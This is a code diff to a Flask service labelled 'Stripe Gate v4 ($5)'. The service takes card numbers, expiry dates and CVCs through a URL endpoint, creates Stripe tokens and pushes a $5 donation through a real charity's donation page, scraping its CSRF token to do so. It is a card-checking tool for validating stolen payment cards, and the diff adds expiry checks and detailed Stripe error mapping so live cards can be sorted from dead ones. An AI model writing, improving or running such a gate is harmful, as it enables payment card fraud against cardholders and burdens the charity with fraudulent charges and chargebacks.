@@ -3,6 +3,7 @@ import json
 import re
 from urllib.parse import unquote
 from flask import Flask, request, jsonify
+from datetime import datetime
 
 app = Flask(__name__)
 session = requests.Session()
@@ -60,12 +61,40 @@ def get_csrf_token():
         r = session.get('https://www.mannahelps.org/donate/money/', headers=headers, timeout=15)
         m = re.search(r'name="csrf_token"\s+value="([^"]+)"', r.text)
         return m.group(1) if m else None
-    except:
+    except Exception as e:
+        print(f"CSRF token error: {e}")
         return None
 
 
 # ===============================================
-# 3. CREATE STRIPE TOKEN
+# 3. CHECK IF CARD IS EXPIRED
+# ===============================================
+def is_card_expired(mm, yy):
+    """Check if the card is expired based on current date"""
+    try:
+        # Convert year to 4 digits if needed
+        if len(yy) == 2:
+            yy = '20' + yy
+        
+        # Get current month and year
+        now = datetime.now()
+        current_year = now.year
+        current_month = now.month
+        
+        # Convert to integers
+        exp_year = int(yy)
+        exp_month = int(mm)
+        
+        # Check if card is expired
+        if exp_year < current_year or (exp_year == current_year and exp_month < current_month):
+            return True
+        return False
+    except:
+        return False
+
+
+# ===============================================
+# 4. CREATE STRIPE TOKEN
 # ===============================================
 def create_stripe_token(cc, mm, yy, cvc):
     if len(yy) == 2:
@@ -96,13 +125,29 @@ def create_stripe_token(cc, mm, yy, cvc):
     try:
         r = session.post('https://api.stripe.com/v1/tokens', headers=headers, data=payload, timeout=20)
         j = r.json()
+        
+        # Check for specific error messages from Stripe
+        if 'error' in j:
+            error_code = j.get('error', {}).get('code', '')
+            error_msg = j.get('error', {}).get('message', '')
+            
+            # Map Stripe errors to our format
+            if error_code == 'expired_card':
+                return None, {"error_code": "expired_card", "message": "Your card has expired"}
+            elif error_code == 'invalid_expiry_year':
+                return None, {"error_code": "invalid_yy", "message": "Your card's year is invalid"}
+            elif error_code == 'invalid_expiry_month':
+                return None, {"error_code": "invalid_mm", "message": "Your card's month is invalid"}
+            else:
+                return None, {"error_code": error_code, "message": error_msg}
+        
         return j.get('id'), None
     except Exception as e:
-        return None, f"Stripe error: {str(e)}"
+        return None, {"error_code": "stripe_error", "message": f"Stripe error: {str(e)}"}
 
 
 # ===============================================
-# 4. SUBMIT $5 DONATION
+# 5. SUBMIT $5 DONATION
 # ===============================================
 def submit_donation(stripe_token):
     csrf = get_csrf_token()
@@ -151,7 +196,7 @@ def submit_donation(stripe_token):
 
 
 # ===============================================
-# 5. MAIN ENDPOINT – $5, NO CC VALIDATION
+# 6. MAIN ENDPOINT – $5, NO CC VALIDATION
 # ===============================================
 @app.route('/gate=stripe1$/cc=<path:card>', methods=['GET'])
 def stripe_gate(card):
@@ -166,15 +211,40 @@ def stripe_gate(card):
 
         cc, mm, yy, cvc = parts
 
-        # Validate only MM, YY, CVC
-        if not mm.isdigit() or not (1 <= int(mm) <= 12):
-            return jsonify({"error_code": "invalid_mm", "response": {"code": "invalid_mm", "message": "Invalid month"}}), 400
-        if not yy.isdigit() or len(yy) not in [2, 4]:
-            return jsonify({"error_code": "invalid_yy", "response": {"code": "invalid_yy", "message": "Invalid year"}}), 400
-        if not cvc.isdigit():
-            return jsonify({"error_code": "invalid_cvc", "response": {"code": "invalid_cvc", "message": "CVC must be digits"}}), 400
+        # === MONTH VALIDATION ===
+        if not mm.isdigit():
+            return jsonify({
+                "error_code": "invalid_mm",
+                "response": {"code": "invalid_mm", "message": "Your card's month is invalid"}
+            }), 400
+        if not (1 <= int(mm) <= 12):
+            return jsonify({
+                "error_code": "invalid_mm",
+                "response": {"code": "invalid_mm", "message": "Your card's month is invalid"}
+            }), 400
 
-        # Amex CVC Rule
+        # === YEAR VALIDATION ===
+        if not yy.isdigit() or len(yy) not in [2, 4]:
+            return jsonify({
+                "error_code": "invalid_yy",
+                "response": {"code": "invalid_yy", "message": "Your card's year is invalid"}
+            }), 400
+
+        # === CHECK IF CARD IS EXPIRED ===
+        if is_card_expired(mm, yy):
+            return jsonify({
+                "error_code": "expired_card",
+                "response": {"code": "expired_card", "message": "Your card has expired"}
+            }), 400
+
+        # === CVC VALIDATION ===
+        if not cvc.isdigit():
+            return jsonify({
+                "error_code": "invalid_cvc",
+                "response": {"code": "invalid_cvc", "message": "CVC must be digits"}
+            }), 400
+
+        # === AMEX CVC RULE ===
         is_amex = cc.startswith('3')
         cvc_len = len(cvc)
 
@@ -197,13 +267,23 @@ def stripe_gate(card):
                     }
                 }), 400
 
-        # Create token
+        # === CREATE TOKEN & SUBMIT ===
         token, err = create_stripe_token(cc, mm, yy, cvc)
         if not token:
-            return jsonify({
-                "error_code": "token_failed",
-                "response": {"code": "token_failed", "message": err or "Token creation failed"}
-            }), 400
+            # Handle different error formats
+            if isinstance(err, dict):
+                return jsonify({
+                    "error_code": err.get("error_code", "token_failed"),
+                    "response": {
+                        "code": err.get("error_code", "token_failed"),
+                        "message": err.get("message", "Token creation failed")
+                    }
+                }), 400
+            else:
+                return jsonify({
+                    "error_code": "token_failed",
+                    "response": {"code": "token_failed", "message": err or "Token creation failed"}
+                }), 400
 
         # Submit $5 donation
         return jsonify(submit_donation(token)), 200
@@ -216,7 +296,7 @@ def stripe_gate(card):
 
 
 # ===============================================
-# 6. HOME PAGE
+# 7. HOME PAGE
 # ===============================================
 @app.route('/')
 def home():
@@ -235,7 +315,7 @@ def home():
 
 
 # ===============================================
-# 7. RUN SERVER
+# 8. RUN SERVER
 # ===============================================
 if __name__ == '__main__':
     print("Stripe Gate v4 ($5) Running")
